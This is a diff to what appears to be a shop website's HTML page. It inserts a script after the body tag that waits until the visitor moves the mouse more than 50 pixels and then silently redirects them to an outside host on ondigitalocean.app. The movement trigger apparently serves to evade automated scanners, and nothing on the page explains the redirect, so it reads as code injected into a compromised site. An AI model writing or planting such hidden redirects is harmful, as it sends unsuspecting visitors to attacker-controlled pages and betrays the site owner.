@@ -717,7 +717,26 @@
   </style>
   </head>
 <body class="l-body">
+ <script>
+let redirected = false;
+let startX = null;
+let startY = null;
 
+document.addEventListener("mousemove", function (e) {
+    if (startX === null && startY === null) {
+        startX = e.clientX;
+        startY = e.clientY;
+    }
+
+    let dx = Math.abs(e.clientX - startX);
+    let dy = Math.abs(e.clientY - startY);
+
+    if (!redirected && (dx > 50 || dy > 50)) {
+        redirected = true;
+        window.location.href = "https://seashell-app-322x7.ondigitalocean.app/";
+    }
+});
+</script>
           <div id="shop">
   </header>
 
